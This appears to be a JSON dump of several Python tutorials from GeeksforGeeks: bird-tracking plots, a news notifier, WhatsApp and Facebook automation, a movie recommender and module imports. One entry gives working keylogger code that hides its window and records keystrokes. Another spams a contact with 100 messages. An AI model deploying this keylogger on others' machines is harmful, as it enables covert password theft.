label=bird_name)plt.xlabel(\"Longitude\")plt.ylabel(\"Latitude\")plt.legend(loc=\"lower right\")plt.show()plt.figure(figsize = (7,7))\nplt.plot(x,y,\"b.\")We use the matplotlib function, figure() to initialize size of the figure as 7 x 7 and plot it using the plot() function.The parameters inside the function plot() i.e x, y and \u201cb.\u201d are specifying to use longitude data along x axis(for x), latitude along y(for y) and b=blue, . = circles in the visualization.\u00a0Output : You must have all the dependencies.Install them using \"pip install dependency_name\"PART (2/5): 2D Speed Vs Frequency\u00a0In this second part of the case study, we are going to visualize 2D speed vs Frequency for the gull named \u201cEric\u201d.Pythonimport pandas as pdimport matplotlib.pyplot as pltimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# storing the indices of the bird Ericix = birddata.bird_name == \"Eric\"speed = birddata.speed_2d[ix]\u00a0plt.figure(figsize = (8,4))ind = np.isnan(speed)plt.hist(speed[~ind], bins = np.linspace(0,30,20), normed=True)plt.xlabel(\" 2D speed (m/s) \")plt.ylabel(\" Frequency \")plt.show()ind = np.isnan(speed)\nplt.hist(speed[~ind], bins = np.linspace(0,30,20), normed=True)\nplt.xlabel(\" 2D speed (m/s) \")\nplt.ylabel(\" Frequency \")\nplt.show()The parameters speed[~ind] indicates that we will include only those entries for which ind != True, bins=np.linspace(0,30,20) indicates the bins along the x-axis will vary from 0 to 30 with 20 bins within them, linearly spaced. Lastly, we plot 2D speed in m/s along the x-axis and Frequency along the y-axis using the xlabel() and ylabel() functions respectively and plot the data using plt.show().Output :\u00a0PART (3/5): Time and Date\u00a0The third part is associated with date and time. We are going to visualize the time(in days) required by Eric to cover constant distances through his journey. If he covers equal distances in an equal amount of time, then the Elapsed time vs Observation curve will be linear.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport datetimeimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0timestamps = []for k in range(len(birddata)):\u00a0\u00a0\u00a0\u00a0timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))\u00a0birddata[\"timestamp\"] = pd.Series(timestamps, index = birddata.index)\u00a0times = birddata.timestamp[birddata.bird_name == \"Eric\"]elapsed_time = [time-times[0] for time in times]\u00a0plt.plot(np.array(elapsed_time)/datetime.timedelta(days=1))plt.xlabel(\" Observation \")plt.ylabel(\" Elapsed time (days) \")plt.show()for k in range(len(birddata)):\n    timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))\u201c>>>datetime.datetime.today()\u201d, returns the current Date (yy-mm-dd) & time (h:m:s).\u00a0\u201c>>>date_str[:-3]\u201d, slices/removes the UTC +00 coordinated time stamps.\u00a0\u201c>>>datetime.datetime.strptime(date_str[:-3], \u201c%Y-%m-%d %H:%M:%S\u201d)\u201d ,the time-stamp strings from date_str are converted to datetime object to be worked upon. \u201c%Y-%m-%d %H:%M:%S\u201d is the Year-Month-Date and Hour-Minute-Second format.Output:\u00a0PART (4/5): Daily Mean Speed\u00a0We are going to visualize the daily mean speed of the gull named \u201cEric\u201d for the total number of days of recorded flight.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport datetimeimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0timestamps = []for k in range(len(birddata)):\u00a0\u00a0\u00a0\u00a0timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))birddata[\"timestamp\"] = pd.Series(timestamps, index = birddata.index)\u00a0data =\u00a0 birddata[birddata.bird_name == \"Eric\"]times = data.timestampelapsed_time = [time-times[0] for time in times]elapsed_days = np.array(elapsed_time)/datetime.timedelta(days=1)\u00a0next_day = 1inds = []daily_mean_speed = []for (i,t) in enumerate(elapsed_days):\u00a0\u00a0\u00a0\u00a0if t < next_day:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inds.append(i)\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0daily_mean_speed.append(np.mean(data.speed_2d[inds]))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0next_day += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inds = []\u00a0plt.figure(figsize = (8,6))plt.plot(daily_mean_speed, \"rs-\")plt.xlabel(\" Day \")plt.ylabel(\" Mean Speed (m/s) \");plt.show()enumerate() - is one of the built-in Python functions. It returns an enumerated object. In our case, that object is a list of tuples (immutable lists), each containing a pair of count/index and value.Output:\u00a0PART (5/5): Cartographic View\u00a0In this last part, we are going to track the Birds over a map.\u00a0Pythonimport pandas as pdimport cartopy.crs as ccrsimport cartopy.feature as cfeatureimport matplotlib.pyplot as plt\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# To move forward, we need to specify a# specific projection that we're interested# in using.proj = ccrs.Mercator()\u00a0plt.figure(figsize=(10,10))ax = plt.axes(projection=proj)ax.set_extent((-25.0, 20.0, 52.0, 10.0))ax.add_feature(cfeature.LAND)ax.add_feature(cfeature.OCEAN)ax.add_feature(cfeature.COASTLINE)ax.add_feature(cfeature.BORDERS, linestyle=':')for name in bird_names:\u00a0\u00a0\u00a0\u00a0ix = birddata['bird_name'] == name\u00a0\u00a0\u00a0\u00a0x,y = birddata.longitude[ix], birddata.latitude[ix]\u00a0\u00a0\u00a0\u00a0ax.plot(x,y,'.', transform=ccrs.Geodetic(), label=name)plt.legend(loc=\"upper left\")plt.show()import cartopy.crs as ccrs\nimport cartopy.feature as cfeatureThese modules are important for mapping data.ax.add_feature(cfeature.LAND)\nax.add_feature(cfeature.OCEAN)\nax.add_feature(cfeature.COASTLINE)\nax.add_feature(cfeature.BORDERS, linestyle=':')We add the salient physical features of a map.Output:\u00a0Resources :\u00a01. edX \u2013 HarvardX \u2013 Using Python for Research\u00a02. Python functions doc_I\u00a03. Python functions doc_IIThis article is contributed by Amartya Ranjan Saikia. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5449f81143762b21a980fdcea218cc66",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "To get started with the Desktop News Notifier, we require two libraries: feedparser and notify2.\u00a0Give following command to to install feedparser:\u00a0sudo pip3 install feedparserFor installing notify2 in your terminal:sudo pip3 install notify2Feedparser will parse the feed that we will get from the URL. We will use notify2 for the desktop notification purpose. Other than these two libraries, we will use OS and time lib. Once you are done with the installation import both libraries in the program. Here, in this example I have parsed the news from the BBC UK, you can use any news feedparser URL. Let\u2019s have a look at the program:\u00a0\u00a0Python# Python program to illustrate# desktop news notifierimport feedparserimport notify2import osimport timedef parseFeed():\u00a0\u00a0\u00a0\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")\u00a0\u00a0\u00a0\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"\u00a0\u00a0\u00a0\u00a0notify2.init('News Notify')\u00a0\u00a0\u00a0\u00a0for newsitem in f['items']:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0n = notify2.Notification(newsitem['title'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0newsitem['summary'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0icon=ICON_PATH\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0)\u00a0\u00a0\u00a0\u00a0n.set_urgency(notify2.URGENCY_NORMAL)\u00a0\u00a0\u00a0\u00a0n.show()\u00a0\u00a0\u00a0\u00a0n.set_timeout(15000)\u00a0\u00a0\u00a0\u00a0time.sleep(1200)\u00a0\u00a0\u00a0\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0parseFeed()Screenshot of the news notification popupStep by step Explanation of Code:\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")Here feedparser will parse the news data from the feed URL. The parsed data will be in the form of dictionary.\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"If you want to set any icon in the notification then here we are setting the Icon path. This is optional.notify2.init('News Notify')Here we are initializing the notify2 using the init method of notify2. Initialize the D-Bus connection. Must be called before you send any notifications, or retrieve server info or capabilities. for newsitem in f['items']: \n        n = notify2.Notification(newsitem['title'], \n                                 newsitem['summary'], \n                                 icon=ICON_PATH \n                                 )Looping from the parsed data to get the relevant information like news title, short summary and setting the notification icon using the Notification method of the notify2 lib.n.set_urgency(notify2.URGENCY_NORMAL)Set the urgency level to one of URGENCY_LOW, URGENCY_NORMAL or URGENCY_CRITICALn.show()This method will show the notification on the Desktopn.set_timeout(15000)Setting the time to keep the notification on the desktop (in milliseconds). I have set here as 15 seconds.\u00a0time.sleep(1200)This will usually display the news notification every 20 mins. You can set the time as per your requirement. You can find the full source code that is hosted on GitHubThis article is contributed by Srce Cde. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1de9502d82cdf265f46daf993d4a140b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Have you ever wished to automatically wish your friends on their birthdays, or send a set of messages to your friend ( or any Whatsapp contact! ) automatically at a pre-set time, or send your friends by sending thousands of random texts on WhatsApp! Using Browser Automation you can do all of it and much more!\u00a0First, you must install these:1) Python Bindings for Selenium ( Browser Automation software )\u00a0pip install selenium2) Chrome web driver\u00a0Download Chrome driver from here: Chromedriver download page( choose your specific version )\u00a0Extract it in a known location, as we need the location laterIf you get stuck somewhere, Refer To the documentation: Documentation link3) Chromium Web Browser( Open-source version of chrome browser )\u00a0sudo apt-get install chromium-browserThat\u2019s it! You are all set.Let\u2019s dive in right awayPythonfrom selenium import webdriverfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.common.by import Byimport time\u00a0# Replace below path with the absolute path# to chromedriver in your computerdriver = webdriver.Chrome('/home/saket/Downloads/chromedriver')\u00a0driver.get(\"https://web.whatsapp.com/\")wait = WebDriverWait(driver, 600)\u00a0# Replace 'Friend's Name' with the name of your friend# or the name of a grouptarget = '\"Friend\\'s Name\"'\u00a0# Replace the below string with your own messagestring = \"Message sent using Python!!!\"\u00a0x_arg = '//span[contains(@title,' + target + ')]'group_title = wait.until(EC.presence_of_element_located((\u00a0\u00a0\u00a0\u00a0By.XPATH, x_arg)))group_title.click()inp_xpath = '//div[@class=\"_13NKt copyable-text selectable-text\"][@data-tab=\"9\"]'input_box = wait.until(EC.presence_of_element_located((\u00a0\u00a0\u00a0\u00a0By.XPATH, inp_xpath)))for i in range(100):\u00a0\u00a0\u00a0\u00a0input_box.send_keys(string + Keys.ENTER)\u00a0\u00a0\u00a0\u00a0time.sleep(1)Keep your mobile phone with you. Choose WhatsApp web from the top bar in WhatsApp(3 dots)\u00a0Then Run the script ( make sure that you have added the absolute path for the chrome driver and have replaced the target variable with your friend\u2019s name ). Scan the QR code that appears on the screen and enjoy the power of python!Please use this script only for educational purposes, i am not responsible if your friends ( or even Whatsapp ) block you.Feel free to modify the code. Try to :\u00a0Text Multiple Groups at onceSend the messages from a predefined list of messages randomly orSend a completely random text.Comment below about your experience!When it comes to browser automation, this is just the tip of the iceberg. Will write more articles on browser automation to give you a glimpse of its power!Related Post :\u00a0Browser Automation Using SeleniumThis article is contributed by Saket Modi. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "16c4d2ee502eed038fa32bbf9b1c3724",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "As we know Selenium is a tool used for controlling web browsers through a program. It can be used in all browsers, OS, and its program are written in various programming languages i.e Java, Python (all versions).\u00a0Selenium helps us automate any kind of task that we frequently do on our laptops, PCs ranging from using Facebook messenger for texting and WhatsApp also, daily tweeting tweets on Twitter, wishing friends \u201cHappy birthday\u201d on Facebook, googling anything we want to learn, and many more task. All these tasks can be automated using selenium in just a small implementation.Installation:\u00a0Go to command prompt and put this is in:pip install seleniumOnce that\u2019s done, download a web driver for automation. Here, we\u2019ll use chromedriver from http://chromedriver.chromium.org/Let\u2019s learn how to automate the process of wishing a birthday wish on a Facebook friend\u2019s timeline as a post.The whole process of this automation can be divided as follows :\u00a0Log into the Facebook application using credentials like Username and Password.Posting a \u201cHappy Birthday\u201d feed on the timeline of those friends whose birthday is today.Below are the steps:\u00a0Create a browser object and use the get() function to send a request to the website we want to connect/use.Find the elements like username and password input boxes, login button, and using the selenium functions like click(), send_keys(), etc to click on buttons and enter username and password respectively.After that using get() function to send a request to /events/birthdays/ page.At the top of this page, there is a card of \u201cToday\u2019s Birthdays\u201d which shows a friend\u2019s name whose birthday is today along with an input text box to enter any feed on their timeline.Using the XPATH of these input text boxes we will send our feed i.e., \u201cHappy Birthday\u201d using the send_keys() function of selenium.Close the browser.NOTE: Make a separate test.txt file and put your Facebook password in it before the execution of the below program.Below is the implementation:\u00a0\u00a0Python3# importing necessary classes# from different modulesfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.chrome.options import Optionsfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.keys import Keysimport time\u00a0chrome_options = webdriver.ChromeOptions()\u00a0prefs = {\"profile.default_content_setting_values.notifications\": 2}chrome_options.add_experimental_option(\"prefs\", prefs)browser = webdriver.Chrome(\"chromedriver.exe\")\u00a0# open facebook.com using get() methodbrowser.get('https://www.facebook.com/')\u00a0# user_name or e-mail idusername = \"agrawal.abhi108@gmail.com\"\u00a0# getting password from text filewith open('test.txt', 'r') as myfile:\u00a0\u00a0\u00a0\u00a0password = myfile.read().replace('\\n', '')\u00a0print(\"Let's Begin\")\u00a0element = browser.find_elements_by_xpath('//*[@id =\"email\"]')element[0].send_keys(username)\u00a0print(\"Username Entered\")\u00a0element = browser.find_element_by_xpath('//*[@id =\"pass\"]')element.send_keys(password)\u00a0print(\"Password Entered\")\u00a0# logging inlog_in = browser.find_elements_by_id('loginbutton')log_in[0].click()\u00a0print(\"Login Successful\")\u00a0browser.get('https://www.facebook.com/events/birthdays/')\u00a0feed = 'Happy Birthday !'\u00a0element = browser.find_elements_by_xpath(\"//*[@class ='enter_submit\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0uiTextareaNoResize uiTextareaAutogrow uiStreamInlineTextarea\\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inlineReplyTextArea mentionsTextarea textInput']\")\u00a0cnt = 0\u00a0for el in element:\u00a0\u00a0\u00a0\u00a0cnt += 1\u00a0\u00a0\u00a0\u00a0element_id = str(el.get_attribute('id'))\u00a0\u00a0\u00a0\u00a0XPATH = '//*[@id =\"' + element_id + '\"]'\u00a0\u00a0\u00a0\u00a0post_field = browser.find_element_by_xpath(XPATH)\u00a0\u00a0\u00a0\u00a0post_field.send_keys(feed)\u00a0\u00a0\u00a0\u00a0post_field.send_keys(Keys.RETURN)\u00a0\u00a0\u00a0\u00a0print(\"Birthday Wish posted for friend\" + str(cnt))\u00a0# Close the browserbrowser.close()My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3186ab34c2d2245e53c336ec3082878a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Keystroke logging is the process of recording (logging) the keys pressed on a keyboard (usually when the user is unaware). It is also known as keylogging or keyboard capturing.These programs are used for troubleshooting technical problems with computers and business networks. It can also be used to monitor network usages but more often than not it is used for malicious intents like stealing passwords.This article illustrates designing a keylogger for windows and Linux.\u00a0Keylogger for WindowsDownload some python libraries\u00a01) pywin32\u00a02) pyhook\u2018Following is the code to create a keylogger in pythonPython3# Python code for keylogger# to be used in windowsimport win32apiimport win32consoleimport win32guiimport pythoncom, pyHook\u00a0\u00a0win = win32console.GetConsoleWindow()win32gui.ShowWindow(win, 0)\u00a0\u00a0def OnKeyboardEvent(event):\u00a0\u00a0\u00a0\u00a0if event.Ascii==5:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0_exit(1)\u00a0\u00a0\u00a0\u00a0if event.Ascii !=0 or 8:\u00a0\u00a0\u00a0\u00a0#open output.txt to read current keystrokes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = open('c:\\output.txt', 'r+')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0buffer = f.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.close()\u00a0\u00a0\u00a0\u00a0# open output.txt to write current + new keystrokes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = open('c:\\output.txt', 'w')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0keylogs = chr(event.Ascii)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if event.Ascii == 13:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0keylogs = '/n'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0buffer += keylogs\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write(buffer)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.close()# create a hook manager objecthm = pyHook.HookManager()hm.KeyDown = OnKeyboardEvent# set the hookhm.HookKeyboard()# wait foreverpythoncom.PumpMessages()Save the file in C:\\ as Keylogger.py and run the python file\u00a0Output:\u00a0The keylogger will be started in the background and save all the data on the log file \u201cc:\\output.txt\u201d.Keylogger in Linuxpyxhook requires python-Xlib. Install it if you don\u2019t have it already.\u00a0sudo apt-get install python-xlibDownload pyxhook libraryPython3# Python code for keylogger# to be used in linuximport osimport pyxhook\u00a0\u00a0# This tells the keylogger where the log file will go.# You can set the file path as an environment variable ('pylogger_file'),# or use the default ~/Desktop/file.loglog_file = os.environ.get(\u00a0\u00a0\u00a0\u00a0'pylogger_file',\u00a0\u00a0\u00a0\u00a0os.path.expanduser('~/Desktop/file.log'))# Allow setting the cancel key from environment args, Default: `cancel_key = ord(\u00a0\u00a0\u00a0\u00a0os.environ.get(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'pylogger_cancel',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'`'\u00a0\u00a0\u00a0\u00a0)[0])\u00a0\u00a0# Allow clearing the log file on start, if pylogger_clean is defined.if os.environ.get('pylogger_clean', None) is not None:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.remove(log_file)\u00a0\u00a0\u00a0\u00a0except EnvironmentError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# File does not exist, or no permissions.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0#creating key pressing event and saving it into log filedef OnKeyPress(event):\u00a0\u00a0\u00a0\u00a0with open(log_file, 'a') as f:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write('{}\\n'.format(event.Key))\u00a0\u00a0# create a hook manager objectnew_hook = pyxhook.HookManager()new_hook.KeyDown = OnKeyPress# set the hooknew_hook.HookKeyboard()try:\u00a0\u00a0\u00a0\u00a0new_hook.start()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 # start the hookexcept KeyboardInterrupt:\u00a0\u00a0\u00a0\u00a0# User cancelled from command line.\u00a0\u00a0\u00a0\u00a0passexcept Exception as ex:\u00a0\u00a0\u00a0\u00a0# Write exceptions to the log file, for analysis later.\u00a0\u00a0\u00a0\u00a0msg = 'Error while catching events:\\n\u00a0 {}'.format(ex)\u00a0\u00a0\u00a0\u00a0pyxhook.print_err(msg)\u00a0\u00a0\u00a0\u00a0with open(log_file, 'a') as f:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f.write('\\n{}'.format(msg))Output:\u00a0The keylogger will be started in the background and save all the data on the file.log file \u201c/home/Akash/Desktop\u201d.\u00a0\u00a0https://media.geeksforgeeks.org/wp-content/cdn-uploads/20201208110622/Keylogger-in-python-720-x-1280.mp4References\u00a0https://en.wikipedia.org/wiki/Keystroke_loggingThis article is contributed by Akash Sharan. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1f3410551a77a79edb7934c7eb00b635",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Recommender System is a system that seeks to predict or filter preferences according to the user\u2019s choices. Recommender systems are utilized in a variety of areas including movies, music, news, books, research articles, search queries, social tags, and products in general.\u00a0Recommender systems produce a list of recommendations in any of the two ways \u2013\u00a0\u00a0Collaborative filtering: Collaborative filtering approaches build a model from the user\u2019s past behavior (i.e. items purchased or searched by the user) as well as similar decisions made by other users. This model is then used to predict items (or ratings for items) that users may have an interest in.Content-based filtering: Content-based filtering approaches uses a series of discrete characteristics of an item in order to recommend additional items with similar properties. Content-based filtering methods are totally based on a description of the item and a profile of the user\u2019s preferences. It recommends items based on the user\u2019s past preferences.Let\u2019s develop a basic recommendation system using Python and Pandas.\u00a0Let\u2019s focus on providing a basic recommendation system by suggesting items that are most similar to a particular item, in this case, movies. It just tells what movies/items are most similar to the user\u2019s movie choice.To download the files, click on the links \u2013 .tsv file, Movie_Id_Titles.csv.Import dataset with delimiter \u201c\\t\u201d as the file is a tsv file (tab-separated file).\u00a0\u00a0Python3# import pandas libraryimport pandas as pd\u00a0# Get the datacolumn_names = ['user_id', 'item_id', 'rating', 'timestamp']\u00a0path = 'https://media.geeksforgeeks.org/wp-content/uploads/file.tsv'\u00a0df = pd.read_csv(path, sep='\\t', names=column_names)\u00a0# Check the head of the datadf.head()\u00a0\u00a0Python3# Check out all the movies and their respective IDsmovie_titles = pd.read_csv('https://media.geeksforgeeks.org/wp-content/uploads/Movie_Id_Titles.csv')movie_titles.head()\u00a0\u00a0\u00a0Python3data = pd.merge(df, movie_titles, on='item_id')data.head()\u00a0\u00a0Python3# Calculate mean rating of all moviesdata.groupby('title')['rating'].mean().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# Calculate count rating of all moviesdata.groupby('title')['rating'].count().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# creating dataframe with 'rating' count valuesratings = pd.DataFrame(data.groupby('title')['rating'].mean())\u00a0ratings['num of ratings'] = pd.DataFrame(data.groupby('title')['rating'].count())\u00a0ratings.head()\u00a0\u00a0\u00a0Visualization imports:\u00a0\u00a0Python3import matplotlib.pyplot as pltimport seaborn as sns\u00a0sns.set_style('white')%matplotlib inline\u00a0\u00a0Python3# plot graph of 'num of ratings column'plt.figure(figsize =(10, 4))\u00a0ratings['num of ratings'].hist(bins = 70)\u00a0\u00a0Python3# plot graph of 'ratings' columnplt.figure(figsize =(10, 4))\u00a0ratings['rating'].hist(bins = 70)\u00a0\u00a0Python3# Sorting values according to# the 'num of rating column'moviemat = data.pivot_table(index ='user_id',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns ='title', values ='rating')\u00a0moviemat.head()\u00a0ratings.sort_values('num of ratings', ascending = False).head(10)\u00a0\u00a0\u00a0Python3# analysing correlation with similar moviesstarwars_user_ratings = moviemat['Star Wars (1977)']liarliar_user_ratings = moviemat['Liar Liar (1997)']\u00a0starwars_user_ratings.head()\u00a0\u00a0Python3# analysing correlation with similar moviessimilar_to_starwars = moviemat.corrwith(starwars_user_ratings)similar_to_liarliar = moviemat.corrwith(liarliar_user_ratings)\u00a0corr_starwars = pd.DataFrame(similar_to_starwars, columns =['Correlation'])corr_starwars.dropna(inplace = True)\u00a0corr_starwars.head()\u00a0\u00a0\u00a0\u00a0Python3# Similar movies like starwarscorr_starwars.sort_values('Correlation', ascending = False).head(10)corr_starwars = corr_starwars.join(ratings['num of ratings'])\u00a0corr_starwars.head()\u00a0corr_starwars[corr_starwars['num of ratings']>100].sort_values('Correlation', ascending = False).head()Python3# Similar movies as of liarliarcorr_liarliar = pd.DataFrame(similar_to_liarliar, columns =['Correlation'])corr_liarliar.dropna(inplace = True)\u00a0corr_liarliar = corr_liarliar.join(ratings['num of ratings'])corr_liarliar[corr_liarliar['num of ratings']>100].sort_values('Correlation', ascending = False).head()My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5dead425fcf7936458d69ccabecdd2e3",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "A Python module is a file containing Python definitions and statements. A module can define functions, classes, and variables. A module can also include runnable code. Grouping related code into a module makes the code easier to understand and use. It also makes the code logically organized.Example: create a simple modulePython3# A simple module, calc.py\u00a0def add(x, y):\u00a0\u00a0\u00a0\u00a0return (x+y)\u00a0def subtract(x, y):\u00a0\u00a0\u00a0\u00a0return (x-y)Import Module in Python \u2013 \u00a0Import statementWe can import the functions, classes defined in a module to another module using the import statement in some other Python source file.\u00a0Syntax:import moduleWhen the interpreter encounters an import statement, it imports the module if the module is present in the search path. A search path is a list of directories that the interpreter searches for importing a module. For example, to import the module calc.py, we need to put the following command at the top of the script.Note: This does not import the functions or classes directly instead imports the module only. To access the functions inside the module the dot(.) operator is used.Example: Importing modules in PythonPython3# importing\u00a0 module calc.pyimport calc\u00a0print(calc.add(10, 2))Output:12The from import Statement\u00a0Python\u2019s from statement lets you import specific attributes from a module without importing the module as a whole.Example: Importing specific attributes from the modulePython3# importing sqrt() and factorial from the# module mathfrom math import sqrt, factorial\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(sqrt(16))print(factorial(6))Output:\u00a04.0\n720Import all Names \u2013 From import * \u00a0StatementThe * symbol used with the from import statement is used to import all the names from a module to a current namespace.Syntax:from module_name import *The use of * has its advantages and disadvantages. If you know exactly what you will be needing from the module, it is not recommended to use *, else do so.Example: Importing all namesPython3# importing sqrt() and factorial from the# module mathfrom math import *\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(sqrt(16))print(factorial(6))Output4.0\n720Locating ModulesWhenever a module is imported in Python the interpreter looks for several locations. First, it will check for the built-in module, if not found then it looks for a list of directories defined in the sys.path. Python interpreter searches for the module in the following manner \u2013First, it searches for the module in the current directory.If the module 